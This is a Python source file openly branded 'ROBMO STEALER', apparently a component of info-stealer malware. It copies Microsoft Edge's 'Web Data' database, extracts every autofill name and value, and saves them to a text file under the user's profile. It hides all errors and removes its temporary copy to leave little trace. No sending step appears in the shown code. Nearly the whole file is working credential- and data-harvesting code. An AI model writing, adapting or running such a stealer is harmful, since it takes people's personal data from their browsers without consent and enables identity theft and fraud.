import os
import sqlite3
import shutil

robmo = """═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════"""
intro = """
╔════════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚════════════════════════════════════════════════╝\n
"""

browsers = {
    '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐄𝐝𝐠𝐞")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofill_data(browser_name, browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀_{browser_name}.txt'), 'w', encoding='utf-8') as f:
                f.write(intro)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in browsers.items():
    get_autofill_data(browser_name, browser_path)
